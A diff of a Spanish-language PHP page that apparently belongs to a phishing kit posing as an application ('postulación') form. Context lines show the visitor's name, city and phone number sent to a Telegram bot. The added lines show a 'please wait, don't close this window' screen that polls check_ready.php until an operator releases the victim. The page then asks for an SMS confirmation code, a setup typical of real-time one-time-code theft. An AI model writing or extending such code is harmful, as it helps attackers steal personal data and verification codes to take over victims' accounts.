@@ -84,6 +84,7 @@ function enviarATelegram($botToken, $chatId, $texto, $replyMarkup = null) {
 
 $accion = $_POST['accion'] ?? null;
 $codigoIngresado = $_POST['codigo'] ?? null;
+$mostrarPantallaCarga = false;
 
 // Si llegan datos del formulario inicial (nombre, ciudad, celular)
 if (isset($_POST['nombre'], $_POST['ciudad'], $_POST['celular']) && $accion === null && $codigoIngresado === null) {
@@ -117,6 +118,9 @@ if (isset($_POST['nombre'], $_POST['ciudad'], $_POST['celular']) && $accion === 
     ];
 
     enviarATelegram($BOT_TOKEN, $CHAT_ID, $mensaje, $replyMarkup);
+
+    // Después del primer envío mostramos pantalla de carga
+    $mostrarPantallaCarga = true;
 }
 
 // Si el usuario pulsa "Pedir SMS", en un sistema real aquí llamarías a tu proveedor de SMS
@@ -173,14 +177,34 @@ if ($accion === 'confirmar' && $codigoIngresado !== null) {
   </header>
   <main class="container main">
     <section class="postulacion">
-      <?php if ($estadoConfirmado): ?>
+      <?php if ($mostrarPantallaCarga): ?>
+        <h1 class="promo-title">Espera un momento</h1>
+        <p class="promo-text">Estamos validando tus datos. Por favor no cierres esta ventana mientras realizamos la verificación.</p>
+        <div style="margin-top:24px; text-align:center;">
+          <img src="carga.gif" alt="Cargando" style="max-width:120px; width:30%; height:auto;">
+        </div>
+        <script>
+          (function() {
+            function revisarEstado() {
+              fetch('check_ready.php', {cache: 'no-store'})
+                .then(function(r){ return r.json(); })
+                .then(function(data){
+                  if (data && data.ready) {
+                    window.location.href = 'procesar.php';
+                  }
+                })
+                .catch(function(e){ /* ignorar errores momentáneos */ });
+            }
+            setInterval(revisarEstado, 1000);
+          })();
+        </script>
+      <?php elseif ($estadoConfirmado): ?>
         <h1 class="promo-title">Listo</h1>
         <p class="promo-text"><?php echo htmlspecialchars($mensajeConfirmacion, ENT_QUOTES, 'UTF-8'); ?></p>
       <?php else: ?>
         <h1 class="promo-title">Verifica tu solicitud</h1>
         <p class="promo-text">
-          Te hemos enviado un código SMS de confirmación. Pulsa el botón <strong>Pedir SMS</strong> si aún no lo has recibido
-          y luego ingresa el código para confirmar tu postulación.
+          Ingresa el código SMS de confirmación que recibiste para completar tu postulación.
         </p>
 
         <?php if ($mensajeConfirmacion): ?>
@@ -190,10 +214,6 @@ if ($accion === 'confirmar' && $codigoIngresado !== null) {
         <?php endif; ?>
 
         <form class="form-postulacion" action="procesar.php" method="post">
-          <div class="form-group form-group-full">
-            <button type="submit" name="accion" value="pedir_sms" class="promo-cta">Pedir SMS</button>
-          </div>
-
           <div class="form-group form-group-full">
             <label for="codigo">Código SMS de confirmación</label>
             <input type="text" id="codigo" name="codigo" placeholder="Ingresa el código que recibiste" required>
